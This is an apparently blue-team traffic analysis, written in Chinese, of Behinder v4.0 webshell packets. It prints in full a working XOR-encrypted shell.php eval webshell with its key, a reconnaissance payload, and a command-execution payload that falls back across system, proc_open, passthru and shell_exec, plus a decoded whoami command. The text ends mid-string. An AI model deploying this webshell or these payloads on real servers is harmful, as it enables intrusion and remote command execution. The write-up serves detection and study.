解密之后结果如下\n&#123;\n\"status\":\"c3VjY2Vzcw==\",\n\"msg\":\"WWtpektNWU1PREpybFB6VlQwdXY1T2JoMkNsMzVmZmVPZ0pDQnZaZElKejhVaGc1ZU42NnlCYWI3YVVqakJ4U3BRcnpneEdJT3pmclR5QWFVQ2Nqa2pTVm1OTU9LNzlrNHhzRjJjd2F2OTF2WFRITG9KdWpmMHpFeU9lTmFWRmdYQUdPT0loaHJKM0JSMkZNaUo5VjZwWGtwb2xQUWNyWGY1UzBuV05SYkE5eHFacmZUM3B4UG1jR3l2RTcxUUtCSkhMa0NJdms5NzdYM2FmZWFmazd4bkpHYlc0MVloNWV4YUp5Q05MTEZVemVaQkNOOUVvUjhNell4cUY3NzJFenp3bXFPbVQ1emxPNjVDUE5DR2JGVzlpc1k2MVlMTVY5WHBKYzRrdjVjcEJmU3NGTkRFbHhvM282MlZvV1FGUjRqTHY3eVY5am9BUVRLcFRiaWVmTmJuQVJidmJQZmlNeFhKTm9QbzVMZWNmNDIxNlZNY000cXJySzVYeEY3ajA1TlpWd3R6MExZZUdNaXlWTmE3bzgyb0xQVVk3ZThaaUhta0x6OVdnbVd5SmpIUVQ5UWhORm8ybVRtNTZPMDhIRHpyMkVhRmpYd3YyWWQ4SjZCZjdHWEtNTGo1OXpHdEgxb2Nqa2dyTHpUMWcwaGtSeTZaRVdyY2NRaEJOZHVwcTlvME9wY1loYTNiSXU0c1lkQk04OFNSaDJGUUxxR0k1TzdIMWVvN0NJTjRRSmpvbUtqMXVVWEFwREVHeGFCMlJZdXU5VWh1MHJwMkdESEdkUHVzaEJBTEdwYUJjZkRBR0ZacjF6ME5XQlBJcnNMS2NoZ2NsNEdFZkY0YmJCVkR1ZXo0bFV3Tm1wc1pzQ0FqRWNDTXNkWmtBUUJwb3Y5YndOTW9peWVSVUcwTUVUQjdYZ096YjVxQjFMaHByWVV2OFV3N1pGNFJYQkNZcnlCd0xHckdkbjVMaHdIazFNVUxvRkpoU0dPaURlRzAzMnhZbEM5ekRjVmUxMlhkbFMwa2YxVGJRUzlyck5OSDF2TzNKZ1NiOTJ2NkhjMWxXaWxJVDlLa1hwVnFZOEhEc1U4bVg4MHF0bktsbkdCcHVsRUUyb2djZlkwR2FVY1RxM09aZXFMeUtlNWFBdzNhTEM2VlFrZFI2MHZwVENlZ1ZMWTBiN3lOTHBMN3A4TmFVMHVOUmNaNXl6cTRQSEhJNk5UakltTEhDUzlPRTREeUtGcm0xbk1KOUdPZEJsdEljOG5FclNiVFl2Q1padkY3YlNnYmhsanEwbWphem1vb21wWld0ZWlCSjM5NGxlbEpYWVVHWFN3dzIyOVd5SzZBdUNZSEU3S3V0TERHbWhCbnI1b0RScm1ySFh6bmx1aDUwTm4wb09ZZDYwTDFNcnpiQzJuQTdXOWVSRk45M0drc2p0MDhRSTByaW1QbDg3Ykw2MmZid0RXcFRxZjhwa3E3eXJWZ0p0N3Z0WVdHeVVxd0lnaE9ibVI4b1pvR0tiTFpOTW53akZlcDJ4ZWVzMnF2dktwTDBkNVZCblhiMmhhcHkzdFplOXpJQVpzWHE5OFFSTTJSUzMzWkt0cXhERWZLWElpcnh4aEhhZndyc1Q4OVN4bUVGUTVTOThsM016dDMwR0JMbUxENnNLQmZLYkQ4ekRRU0xJdGo5ME41Zzg2eng4NjRTeURBa0hPTGJYUnVISWRJeE1Manp6aTV6YjNnbENwTTFXenpVZVlacExyVW13QXJrTEJaanFhQTdQZTlUZWY2ZlJURWhwQmNxUUE2N09ZZnduVFB3akdwazY3Q2wxS3ZmSzFOeDRWQVRVR2tGZjY1enZoa0NDWVNqYWVGN0hCUFEzc3lJa2puVUI3TEdZSERVNDVVNHI1ZUxOTGVCc0Fhb1NSeUtuT3RCQ3Jsd05HTWxGejFYclZkc0NRMUIwWXRGS3FUd25NZVVmd3NzcGdPZWNFTW0xYnd3WnJKVlZSVG0zY29ZWk5HellrZExCS011WFN5dWVaRFVnc1dDWFdRTlJNcmUyVWJXa0hvYnA5QmF5U25GZ01MaXVKV2pXNFRqek9mekFJa2h2c2FwNlF4VTBjVVZxNXJhaGJGaW9VYTREVERPbTJoS055bk1uQWdVTnZFR1BUNXR2eWNQWEpVa2R4em9yb3dMc2RzY2dWYldGMXFSdEJKc0xQQlJsZ2Y4OWE4QWUxUHNqNms1OE9CRGhBMzRiOERYMTJ4OTZDYUNzZFBWMlJFWFEzdENHSFdZblJNb1FOclFSdXhZZjhPQmVNVm9IUjBiblJnV0RLWGI3ZWZhc2owYUl4Q1c2eDNRQkdQTXNsQmtoQW5UUnVYc0xFRGN5eENlNjBDdHhXN3hpaHA5Skc3S2tKbW5PUlNneWZiYXRvZG9EMHVHajhCQUYzRThuM3NHbVNCdEFkdk9OWjB0T3BPUVgzaW10Rks1QUFTeGJ4RHZZTGM4d2RBQXI4ZmUxQU5kRmVJUGhiUWxha0hIUmp3bmVhNnpNcTA4R0ZreFFPTFhOOExSMlZVdlBUYlowV1FPUXh0azhQVW0zaVM3YkhaeVAzVzdsVkJ0N2EwQjE5aUJicWkxbjNQenpLdWhURXJKTzE5Mm5JemxOREpTQm55cUJ4U0IwcERjZ0RoWHFQdG42VHAzQkh4eEJWUzVpVFczU1FPeHlVVmwydGdoWVphb3NzTGlsWWdVcnVBMEQwYjdKVlpqZ1lMV0dhcmdrZjZpa3dVSDNWZVZlN0FIemZWRHdJVFlpUTNPOFJSUjkwOEwwWkp0Y1ZSUzBZMWYwMDBQaHFSWGE2aDhpZWpnWXQ1V3UzWlZYZ1BJM0N3c1ZnVVB0eElWM0xUMHkyV3VDcDJLc2RDVEQyRXBKMzVKUnpCTWd3dTFhajBvaWlyaXBGY04zbmpyQjBESE1Xck5tMFRNUWZvTU9uSTYzcXhxTE1kcngyelhmTlFmbTNKTWRKTDRONUtYSXZRYmI4Q090bHNsVG1oRmVMbEQzUWFWTmJEYUxXdEZhRTltNHdIRHl2eGM3b3lGVHBZYWdWTUNHM3BrMVJscTM2OFRYS1RhSmRTYVgyNmcyalhZNjBjb0RZalJ3QkpPWVlkb01DUzVoRGY3SWdZSkNNMUxLenlXZEtQSUtDaUpoTnQ5S2FXNlFnR0pNZUxxUVJ3R0FnNDQ3cmc1M2c0a1ptSW5oNDBTbGFpQnB3a3p5MWVnb0JvVXhZa2FOZnVJTGFvNXhZb2FYOHRZTjhBNHlxTjlJRWszY0tuVVNqTjRST0RMUHh0ZGlHRnNWSWxabkpQVFVjUnVyclRWbGV3SE05UXVydU14d1hXdjdHT205cjdISG9sOUsxbUExNDh4bGMzZU5IeVl3VmJRVHFoeUlWZGQ5b0JMeTlqOXZ0UkFnV250TE5tWmtZRUxvbXdHV0xUN2k5MnJGZ2VLZERPd1M1ZUtsVg==\"\n&#125;\n\n经过 base64 解密，status 对应的是 success，证明能够收到这个包，并且和前面对照上。\n\n\n继续分析下一个包，代码如下，这里就进行了命令执行\nerror_reporting(0);\nfunction main($whatever) \n&#123;    \n    $result = array();    \n    ob_start(); \n    phpinfo(); \n    $info = ob_get_contents(); \n    ob_end_clean();    \n    $driveList =\"\";    \n    if (stristr(PHP_OS,\"windows\")||stristr(PHP_OS,\"winnt\"))&#123;        \n        for($i=65;$i&lt;=90;$i++) &#123;    \n            $drive=chr($i).':/';    \n            file_exists($drive) ? $driveList=$driveList.$drive.\";\":'';    \n        &#125;    \n    &#125; else &#123;\n        $driveList=\"/\";\n    &#125;    \n    $currentPath=getcwd();    \n    //echo \"phpinfo=\".$info.\"\\n\".\"currentPath=\".$currentPath.\"\\n\".\"driveList=\".$driveList;\n    $osInfo=PHP_OS;    \n    $arch=\"64\";    \n    if (PHP_INT_SIZE == 4) &#123;\n        $arch = \"32\";    \n    &#125;    \n    $localIp=gethostbyname(gethostname());    \n    if ($localIp!=$_SERVER['SERVER_ADDR']) &#123;        \n        $localIp=$localIp.\" \".$_SERVER['SERVER_ADDR'];    \n    &#125;    \n    $extraIps=getInnerIP();    \n    foreach($extraIps as $ip) &#123;        \n        if (strpos($localIp,$ip)===false) &#123;         \n            $localIp=$localIp.\" \".$ip;        \n        &#125;    \n    &#125;    \n    $basicInfoObj=array(\n        \"basicInfo\"=>base64_encode($info),\n        \"driveList\"=>base64_encode($driveList),\n        \"currentPath\"=>base64_encode($currentPath),\n        \"osInfo\"=>base64_encode($osInfo),\n        \"arch\"=>base64_encode($arch),\n        \"localIp\"=>base64_encode($localIp));    \n        //echo json_encode($result);    \n        $result[\"status\"] = base64_encode(\"success\");    \n        $result[\"msg\"] = base64_encode(json_encode($basicInfoObj));    \n        //echo json_encode($result);    \n        //echo openssl_encrypt(json_encode($result), \"AES128\", $key);    \n        echo encrypt(json_encode($result));\n    &#125;\n    function getInnerIP()\n    &#123;\n        $result = array();\n        if (is_callable(\"exec\"))\n        &#123;    \n            $result = array();    \n            exec('arp -a',$sa);    \n            foreach($sa as $s)    \n            &#123;        \n                if (strpos($s,'---')!==false) &#123;\n                    $parts=explode(' ',$s);\n                    $ip=$parts[1];\n                    array_push($result,$ip);\n                &#125; \n                //var_dump(explode(' ',$s));           \n                // array_push($result,explode(' ',$s)[1]);    \n            &#125;\n        &#125;\n        return $result;\n    &#125;\n    function encrypt($data)\n    &#123;    \n        $key=\"25f9e794323b4538\"; \n        for($i=0;$i&lt;strlen($data);$i++) &#123;    \n            $data[$i] = $data[$i]^$key[$i+1&amp;15];     \n        &#125;    \n        $bs=\"base64_\".\"encode\";\n        $after=$bs($data.\"\");    \n        return $after;\n    &#125;\n    $whatever=\"RWN4cTE4VFlUNGRVUWhaalZ5UW1Kamw4R2RTZlJIalhlRFg2djR3Y1RLVFhhWnQxaFhES3ZBMW9QYjlPWmlGNlEyNUNVcXVkV2J4Q0dTUG5YZ3B2RjRDVWlGbGwxNVk2d3RMWUhnbjRVWWRETDdVbHNoWjNrZmNCNlUzNWNRRW5hU1g1RFNQSDI1Snpmc2ZqRzJBQWJyaDZMUDVxMWZuMm1JVzIxTklWR0JraTViUE1XTnBnVG5wVFJ5cEpsQmdCTlJmSW1WYzIzRERmVlRoeDBpQ1pLcHpvVVdzMXZmUXM5NkhMVFVUNGhpQ3NXZWVYTFk1TnJOdHZNVEFXcTlMYUhFOHRoRUhzaXpBQldnaWtYUkhweDc1b2pvWWpyTUJOMkxvNmpuNWRndDVDSTNJc2I4dHpUdHF3dG5yRGxYNTlHNEtyS0NMSUw3Ym9lQk9mWjJldnlQSk5Jc2RCOU9SRVVUSGk0Q1NLaFJjNkJpcUZGMVM0MWVDcFdtaEpYT2hEaHVkdnNMUUNPbzREQ3pKekhjdG5KZXBuemJ0YkE1TU50bXhWTUNoOUM5dm5VMDNZM3IyRFBOZVJqeUd0b0t2ZFdhWk5ETU96WHEzdmFQQmFobXdNcTBvdVlyanlPZmVaRVNMYXhwWlFlVWtvendGOTlUaGJaUTZVVU82dVFZVEVMUHJJWnFYeFRVbXNhaGxqZnFmZmJGbVBIbGxQSlNaSmtpRnNORkM3UFRNbjFoOFlmUUYwVm1RNW1oMXVlbllTNEd4NXB4UVNHV2lzTE1UaFpaTUJNeHZlRldGZ2E3ZHA1MDA3ZXhHbG5rUEZjZ21jZjJFUktDUDdkajlNQVk5OHdEOXhkQVBkQTZhQ2ozeERja2VFZzZVWnhaMmQ5ZzF2c1BmdWRPbkZJSTc3MnJuSFE0emxDSllFSGxXQmVWeXhycjRkRHNzdkFKZTBRT2U4VXpoYkJ5YjhzOXpvZU54dm00S2VhY1R2QUdhalBBUFBSZlV3dDZwbnhxdjF3ZjVKZEhOSmxvRXJERWNIRTYyQWZmSGZseXNqbXBOVHZ4WGFJTE9WdTBHRUlpUXA1ZU4xOUluTktMc2huZnNSR0hBUjh3aWFyZ2MwVElCYmwyZG9lVmt4Qm5seGl6QmlyODBqZDlrR3pacHhncGUyTlpGVHNMdlR3WFZlZHduWVlMeVF5TjNORFpNdWVhVE9ZemJQT2VaZ2g1d3VSZEtjYUtEQUhCYmozd0lOeW1vd3Y0eGJ6cGtuUmZGUDlrOVA1MFdKT0FrbUVvUXE2TW1KdlNXWmw1ZzB4YmNValVDeDI1WHFwd3FLa1J4UTFZR24xM3NoVWhzY3Z6aHBqVzA4SUsweGFLTW5QNDY5RXB5VkF0RUpYYXpZem81aXpzVVRqcmxBRktoZnNKclZkR2ZRZFVxTmJQZnV3R2JqZVBpWXVOUThmVW0yOEszaFJXV3RtWkFXQ0JCeHRGQk1BQlg5ZmxVQktZUnc2cHd6dDRIMzY4N0NobW9JSE5QQ2QwUjQzdkx1aEM2SmdFSUZkZXVpRjUxODFZVVZFQWF1WU82bmxiOEo2RnBEU0Q0SHVsNDYyQXBRQzF6N0JEZ0c3aklhQWNkNWhGT0k0bFBxQXc2S0ZCUWE5QVM5NktWSVRDajFMN1dYSFZKZ01XN005RThyeFRBaXlseWJreFV1b256VWlNS0lBU2wwZkVjcjNZTFVrUTFtQUxKb2ZJc0s4SjllZG9Ca0RXWWY4eEJ1VVJLTVJLaGtYdm52cU5ySmx4MlJmbmtwQlV2QmVWYVZvbzlOeXB6Q0NTVmpZM2RYdlVUdk9FbUdldHJ4eU5kZTNoQ1FlMmduckRVM1F1andxN1NKTURVRld3YVBueHRlRnR3V2FScTY2WlRURHpIRHNDUkF3UDdnUkNSNGZKaHJzZmlINXRWcGpvdWprZlc4Zk93UUFYYVV2V3VaakRwMVFWTWRBN2JXMGZIbU1QNkdXb2VDeFZiWUdOSDV1OTluejRxNUM3emliVDMzNkVSWnRIUVh2M0s1ZW5BcEgyNkwyZlBYaUJtaU1zcHZMOGloeFlWdTJtRE9aOTdKc2drYnRqNGZLSWNnSEJtOUZxbmFTWmVoblNjVURnY3o2RDE1RmxkZjM2bnptQWtaSW1WR083enplakQ4cFpDUXBGdTZtMkRIVk51NG8xcEJOZVhLZXVNSjd6VVIyM1VuOElVVDlKUHZQeE0yZk5EZ09yUEJXczdwSHk0TklHbFRJbGZWZ0tGTFBnNVZTWmZaOXhaTnpQVm9kWUZDS1RwWlNSUGtCS2NqcWFyeEhSanRHTkZveXh2M0poRjhDdkN0emFuTlM2OHp5WTQyekIzM0NXNmdGeGdvaFdMVkJiVUlES3RsVWhGdDBTZnZ3bDlEZDdIWFdmbXFjcFZpWmNxRE1mcWVXaVg3STh6YzNxY3dscHlzVFNsSVl5anZGc2hhREFNWTZsNG1qMFdsRHppZHhFOXpldmtPeFpETzlheVBJOWJlbWxDNmk4WUppR1dnRTNqclI0ZUw0T0xncEJNQnZyS0RUckF2QTNnUXdyTU9iOHFhZzJ1VzFXRHhMQ0ZRRktNWGVVYjJhcFhDRjMyQkIzRzBpU1VBVGJMSVBpeEltOHBVakRMazkyZDBkR29heEVPeWl4U1ZjWENEampLaHBFVm13NkFQQTI0VUNpUFd1TVR5S21aTTFnNUszdzd0SjFuNzNhV200RFE0OG9Oakhmbm81Y0FPT05uWlAyVE9SWGJibFFYb1VPcW5idXFCRmlrQTJRVnQwazdBYkdmbWp0Z01Bbk5xODFUUEpOVzdvYzNTbDBFYUNLOEpCMTNialBTam5hdkZSdU5vNWxpWkhZSTlMOWNBRkdhMDhDMUhlYXpFR0plalhINjJNMUo3NlphNnNZT1hLN202d05wZnhTVTh5WGlPSG1GNlVPVVNJdHVGVWFMcW1Td00yMTFrbFdFTG40cEREQ3Ftd3NMZEpiV2szOE5FZXh5QW9kSmV0dDVuWlVKdlNXVFF1VVE0WVJRWlR3V2ZEaGZxTGI2RzRKaEtXYmFIYUdIaGtrQWk5Wm9Rbkx4RUVVdGJCSjJjVmNwMjhKRVNKMGpSSFNZYU83ek1US3Z3ZVlGN0ZTMk5hUlhBOUx1NkFjemxCYTNraXd6TEZmNlZrWEM5WVVCVURTVkhmdHVrTDNOWnRxVlB2R2dUZGpNVzJLTzFFcXpIVHBXblVpejU2MXNRTjNNa25UUWh5V2xVcFZOeFpmN1hBR0IwMnJVSk1yczVQblhZMXpadDhqbmF4d2h3amVWYnpiZ3FYc0ZBeXAydkpCbGtnVUg2NzRjQ3J4OUM0YzdTdW96bkZVOVZBeGJlekNRc2VqMElSNkxyQlNmZkNwYkwycjJLN0xBWTZFTnNiQjh3bFBuM1dvMTA4Y2IzcHNGT0Q3dzROcHNsSHZpc0szZVZVQ0psRm93RjdZSk5JQzVITWVZRmtjaEtkS1dDUUdOT3RwaDh3\";\n$whatever=base64_decode($whatever);\nmain($whatever);\n\n\n这里我不太明白传入的 $whatever 是做什么的，感觉没什么用，这个脚本本质上还是在运行 phpinfo() 的命令执行。\n\n把相应包解密出来，内容如下\n&#123;\n\"status\":\"c3VjY2Vzcw==\",\n\"msg\":\"xxx略，篇幅太长\"\n&#125;\n\n把这一串 msg 内容放到 base64 解密，不难发现响应内容其实就是 phpinfo() 的命令回显。\n\n\n\n\n\n至于后面的命令执行部分，是比较好分析的\n\n把流量包提取出来，进行解密\n@error_reporting(0);\n\nfunction getSafeStr($str)&#123;\n    $s1 = iconv('utf-8','gbk//IGNORE',$str);\n    $s0 = iconv('gbk','utf-8//IGNORE',$s1);\n    if($s0 == $str)&#123;\n        return $s0;\n    &#125;else&#123;\n        return iconv('gbk','utf-8//IGNORE',$str);\n    &#125;\n&#125;\nfunction main($cmd,$path)\n&#123;\n    @set_time_limit(0);\n    @ignore_user_abort(1);\n    @ini_set('max_execution_time', 0);\n    $result = array();\n    $PadtJn = @ini_get('disable_functions');\n    if (! empty($PadtJn)) &#123;\n        $PadtJn = preg_replace('/[, ]+/', ',', $PadtJn);\n        $PadtJn = explode(',', $PadtJn);\n        $PadtJn = array_map('trim', $PadtJn);\n    &#125; else &#123;\n        $PadtJn = array();\n    &#125;\n    $c = $cmd;\n    if (FALSE !== strpos(strtolower(PHP_OS), 'win')) &#123;\n        $c = $c . \" 2>&amp;1\\n\";\n    &#125;\n    $JueQDBH = 'is_callable';\n    $Bvce = 'in_array';\n    if ($JueQDBH('system') and ! $Bvce('system', $PadtJn)) &#123;\n        ob_start();\n        system($c);\n        $kWJW = ob_get_contents();\n        ob_end_clean();\n    &#125; else if ($JueQDBH('proc_open') and ! $Bvce('proc_open', $PadtJn)) &#123;\n        $handle = proc_open($c, array(\n            array(\n                'pipe',\n                'r'\n            ),\n            array(\n                'pipe',\n                'w'\n            ),\n            array(\n                'pipe',\n                'w'\n            )\n        ), $pipes);\n        $kWJW = NULL;\n        while (! feof($pipes[1])) &#123;\n            $kWJW .= fread($pipes[1], 1024);\n        &#125;\n        @proc_close($handle);\n    &#125; else if ($JueQDBH('passthru') and ! $Bvce('passthru', $PadtJn)) &#123;\n        ob_start();\n        passthru($c);\n        $kWJW = ob_get_contents();\n        ob_end_clean();\n    &#125; else if ($JueQDBH('shell_exec') and ! $Bvce('shell_exec', $PadtJn)) &#123;\n        $kWJW = shell_exec($c);\n    &#125; else if ($JueQDBH('exec') and ! $Bvce('exec', $PadtJn)) &#123;\n        $kWJW = array();\n        exec($c, $kWJW);\n        $kWJW = join(chr(10), $kWJW) . chr(10);\n    &#125; else if ($JueQDBH('exec') and ! $Bvce('popen', $PadtJn)) &#123;\n        $fp = popen($c, 'r');\n        $kWJW = NULL;\n        if (is_resource($fp)) &#123;\n            while (! feof($fp)) &#123;\n                $kWJW .= fread($fp, 1024);\n            &#125;\n        &#125;\n        @pclose($fp);\n    &#125; else &#123;\n        $kWJW = 0;\n        $result[\"status\"] = base64_encode(\"fail\");\n        $result[\"msg\"] = base64_encode(\"none of proc_open/passthru/shell_exec/exec/exec is available\");\n        $key = $_SESSION['k'];\n        echo encrypt(json_encode($result));\n        return;\n\n    &#125;\n    $result[\"status\"] = base64_encode(\"success\");\n    $result[\"msg\"] = base64_encode(getSafeStr($kWJW));\n    echo encrypt(json_encode($result));\n&#125;\n\n\nfunction encrypt($data)\n&#123;\n    $key=\"25f9e794323b4538\";\n        for($i=0;$i&lt;strlen($data);$i++) &#123;\n        $data[$i] = $data[$i]^$key[$i+1&amp;15];\n    &#125;\n    $bs=\"base64_\".\"encode\";\n        $after=$bs($data.\"\");\n    return $after;\n&#125;\n$cmd=\"Y2QgL2QgIkM6XHBocHN0dWR5X3Byb1xXV1dcZGlhZ25vc3RpY18wXGRpYWdub3N0aWNcYXNzZXRzXHVwbG9hZEltYWdlXExvZ29cIiZ3aG9hbWk=\";\n$cmd=base64_decode($cmd);\n$path=\"QzovcGhwc3R1ZHlfcHJvL1dXVy9kaWFnbm9zdGljXzAvZGlhZ25vc3RpYy9hc3NldHMvdXBsb2FkSW1hZ2UvTG9nby8=\";\n$path=base64_decode($path);\nmain($cmd,$path);\n\n$cmd 对应的是 cd /d &quot;C:\\phpstudy_pro\\WWW\\diagnostic_0\\diagnostic\\assets\\uploadImage\\Logo\\&quot;&amp;whoami\n$path 对应的是 C:/phpstudy_pro/WWW/diagnostic_0/diagnostic/assets/uploadImage/Logo/\n对应回显是\n&#123;\"status\":\"c3VjY2Vzcw==\",\"msg\":\"ZGVza3RvcC1xbWNzOWdvXGRydW5rYmFieQ0K\"&#125;\n\n\n\n一些疑问和改进点简单来说，如果作为蓝队，需要严格分析的是第三个流量包，也就是命令执行的流量包，这也最容易分析。在学习阶段我也思考了具体的几个点\n\n1、连马是如何连上的，看起来 shell.php 需要我们 post 传入 $data，这一步在流量分析中并没有抓到。\n2、针对 aes，xor_base64 进行加密的防御型脚本检测。\n3、冰蝎的改写，是否可以采用新型加密方式。\n\n0x04 冰蝎传输与攻防冰蝎传输与连马&amp;命令执行\n一开始这里我也不太理解，后面在看了冰蝎作者的文章之后恍然大悟，原文链接 —— https://mp.weixin.qq.com/s/EwY8if6ed_hZ3nQBiC3o7A\n\n冰蝎 v4.0 版本不再有连接密码的概念，你的自定义传输协议的算法就是连接密码。按照冰蝎 3.0 版本当中的密码依旧是 “rebeyond”，但是冰蝎 v4.0 的马使用蚁剑，以 “rebeyond” 作为密码是连不上的（亲测\n在流量层，冰蝎的 aes 特征一直是厂商查杀的重点，在主机层，aes 相关的 API 也是一个强特征。既然是特征，那就一定存在一个一成不变的常量，那我们就把这个特征泛化一下，让他成为变量。为了一劳永逸解决这个问题，v4.0 版本提供了传输协议自定义功能，让用户对流量的加密和解密进行自定义，实现流量加解密协议的去中心化。\n首先看一下冰蝎Payload流转的流程图：\n\n\n可以分为这五个流程\n\n1、本地对 Payload 进行加密，然后通过 POST 请求发送给远程服务端；\n2、服务端收到 Payload 密文后，利用解密算法进行解密；\n3、服务端执行解密后的 Payload，并获取执行结果；\n\n这三步的基础是 shell.php，通过 post 请求传 body\n&lt;?php\n@error_reporting(0);\n\tfunction decrypt($data)\n&#123;\n    $key=\"25f9e794323b4538\"; \n    $bs=\"base64_\".\"decode\";\n\t$after=$bs($data.\"\");\n\tfor($i=0;$i&lt;strlen($after);$i++) &#123;\n    \t$after[$i] = $after[$i]^$key[$i+1&amp;15]; \n    &#125;\n    return $after;\n&#125;\n\t$post=Decrypt(file_get_contents(\"php://input\"));\n    eval($post);\n?>\n\n在第一次传输的时候，做了密钥协商与指纹确认的事情，冰蝎需要先确定你（受攻击端）确实是能够和我（本地攻击者）进行加解密，或者说可以进行数据传输，这也就是第一次发包。\n对应的代码如下，这是冰蝎当中 payload/php 下的代码 ———— Echo.php\n\n\n\n在实际传输过程中会发现冰蝎发包时多了一个 encrypt() 函数，我后续会对这一现象进行解释。\n\n@error_reporting(0);\n\nfunction main($content)\n&#123;\n    $result = array();\n    $result[\"status\"] = base64_encode(\"success\");\n    $result[\"msg\"] = base64_encode($content);\n    @session_start();    //初始化session，避免connect之后直接background，后续get result无法获取cookie\n    echo encrypt(json_encode($result));\n&#125;\n\nfunction encrypt($data)\n&#123;    \n    $key=\"25f9e794323b4538\"; \n    for($i=0;$i&lt;strlen($data);$i++) &#123;\n        $data[$i] = $data[$i]^$key[$i+1&amp;15];     \n    &#125;    \n    $bs=\"base64_\".\"encode\";\n    $after=$bs($data.\"\");    \n    return $after;\n&#125;\n\n$content=\"WWtpektNWU1PREpybFB6VlQwdXY1T2JoMkNsMzVmZmVPZ0pDQnZaZElKejhVaGc1ZU42NnlCYWI3YVVqakJ4U3BRcnpneEdJT3pmclR5QWFVQ2Nqa2pTVm1OTU9LNzlrNHhzRjJjd2F2OTF2WFRITG9KdWpmMHpFeU9lTmFWRmdYQUdPT0loaHJKM0JSMkZNaUo5VjZwWGtwb2xQUWNyWGY1UzBuV05SYkE5eHFacmZUM3B4UG1jR3l2RTcxUUtCSkhMa0NJdms5NzdYM2FmZWFmazd4bkpHYlc0MVloNWV4YUp5Q05MTEZVemVaQkNOOUVvUjhNell4cUY3NzJFenp3bXFPbVQ1emxPNjVDUE5DR2JGVzlpc1k2MVlMTVY5WHBKYzRrdjVjcEJmU3NGTkRFbHhvM282MlZvV1FGUjRqTHY3eVY5am9BUVRLcFRiaWVmTmJuQVJidmJQZmlNeFhKTm9QbzVMZWNmNDIxNlZNY000cXJySzVYeEY3ajA1TlpWd3R6MExZZUdNaXlWTmE3bzgyb0xQVVk3ZThaaUhta0x6OVdnbVd5SmpIUVQ5UWhORm8ybVRtNTZPMDhIRHpyMkVhRmpYd3YyWWQ4SjZCZjdHWEtNTGo1OXpHdEgxb2Nqa2dyTHpUMWcwaGtSeTZaRVdyY2NRaEJOZHVwcTlvME9wY1loYTNiSXU0c1lkQk04OFNSaDJGUUxxR0k1TzdIMWVvN0NJTjRRSmpvbUtqMXVVWEFwREVHeGFCMlJZdXU5VWh1MHJwMkdESEdkUHVzaEJBTEdwYUJjZkRBR0ZacjF6ME5XQlBJcnNMS2NoZ2NsNEdFZkY0YmJCVkR1ZXo0bFV3Tm1wc1pzQ0FqRWNDTXNkWmtBUUJwb3Y5YndOTW9peWVSVUcwTUVUQjdYZ096YjVxQjFMaHByWVV2OFV3N1pGNFJYQkNZcnlCd0xHckdkbjVMaHdIazFNVUxvRkpoU0dPaURlRzAzMnhZbEM5ekRjVmUxMlhkbFMwa2YxVGJRUzlyck5OSDF2TzNKZ1NiOTJ2NkhjMWxXaWxJVDlLa1hwVnFZOEhEc1U4bVg4MHF0bktsbkdCcHVsRUUyb2djZlkwR2FVY1RxM09aZXFMeUtlNWFBdzNhTEM2VlFrZFI2MHZwVENlZ1ZMWTBiN3lOTHBMN3A4TmFVMHVOUmNaNXl6cTRQSEhJNk5UakltTEhDUzlPRTREeUtGcm0xbk1KOUdPZEJsdEljOG5FclNiVFl2Q1padkY3YlNnYmhsanEwbWphem1vb21wWld0ZWlCSjM5NGxlbEpYWVVHWFN3dzIyOVd5SzZBdUNZSEU3S3V0TERHbWhCbnI1b0RScm1ySFh6bmx1aDUwTm4wb09ZZDYwTDFNcnpiQzJuQTdXOWVSRk45M0drc2p0MDhRSTByaW1QbDg3Ykw2MmZid0RXcFRxZjhwa3E3eXJWZ0p0N3Z0WVdHeVVxd0lnaE9ibVI4b1pvR0tiTFpOTW53akZlcDJ4ZWVzMnF2dktwTDBkNVZCblhiMmhhcHkzdFplOXpJQVpzWHE5OFFSTTJSUzMzWkt0cXhERWZLWElpcnh4aEhhZndyc1Q4OVN4bUVGUTVTOThsM016dDMwR0JMbUxENnNLQmZLYkQ4ekRRU0xJdGo5ME41Zzg2eng4NjRTeURBa0hPTGJYUnVISWRJeE1Manp6aTV6YjNnbENwTTFXenpVZVlacExyVW13QXJrTEJaanFhQTdQZTlUZWY2ZlJURWhwQmNxUUE2N09ZZnduVFB3akdwazY3Q2wxS3ZmSzFOeDRWQVRVR2tGZjY1enZoa0NDWVNqYWVGN0hCUFEzc3lJa2puVUI3TEdZSERVNDVVNHI1ZUxOTGVCc0Fhb1NSeUtuT3RCQ3Jsd05HTWxGejFYclZkc0NRMUIwWXRGS3FUd25NZVVmd3NzcGdPZWNFTW0xYnd3WnJKVlZSVG0zY29ZWk5HellrZExCS011WFN5dWVaRFVnc1dDWFdRTlJNcmUyVWJXa0hvYnA5QmF5U25GZ01MaXVKV2pXNFRqek9mekFJa2h2c2FwNlF4VTBjVVZxNXJhaGJGaW9VYTREVERPbTJoS055bk1uQWdVTnZFR1BUNXR2eWNQWEpVa2R4em9yb3dMc2RzY2dWYldGMXFSdEJKc0xQQlJsZ2Y4OWE4QWUxUHNqNms1OE9CRGhBMzRiOERYMTJ4OTZDYUNzZFBWMlJFWFEzdENHSFdZblJNb1FOclFSdXhZZjhPQmVNVm9IUjBiblJnV0RLWGI3ZWZhc2owYUl4Q1c2eDNRQkdQTXNsQmtoQW5UUnVYc0xFRGN5eENlNjBDdHhXN3hpaHA5Skc3S2tKbW5PUlNneWZiYXRvZG9EMHVHajhCQUYzRThuM3NHbVNCdEFkdk9OWjB0T3BPUVgzaW10Rks1QUFTeGJ4RHZZTGM4d2RBQXI4ZmUxQU5kRmVJUGhiUWxha0hIUmp3bmVhNnpNcTA4R0ZreFFPTFhOOExSMlZVdlBUYlowV1FPUXh0azhQVW0zaVM3YkhaeVAzVzdsVkJ0N2EwQjE5aUJicWkxbjNQenpLdWhURXJKTzE5Mm5JemxOREpTQm55cUJ4U0IwcERjZ0RoWHFQdG42VHAzQkh4eEJWUzVpVFczU1FPeHlVVmwydGdoWVphb3NzTGlsWWdVcnVBMEQwYjdKVlpqZ1lMV0dhcmdrZjZpa3dVSDNWZVZlN0FIemZWRHdJVFlpUTNPOFJSUjkwOEwwWkp0Y1ZSUzBZMWYwMDBQaHFSWGE2aDhpZWpnWXQ1V3UzWlZYZ1BJM0N3c1ZnVVB0eElWM0xUMHkyV3VDcDJLc2RDVEQyRXBKMzVKUnpCTWd3dTFhajBvaWlyaXBGY04zbmpyQjBESE1Xck5tMFRNUWZvTU9uSTYzcXhxTE1kcngyelhmTlFmbTNKTWRKTDRONUtYSXZRYmI4Q090bHNsVG1oRmVMbEQzUWFWTmJEYUxXdEZhRTltNHdIRHl2eGM3b3lGVHBZYWdWTUNHM3BrMVJscTM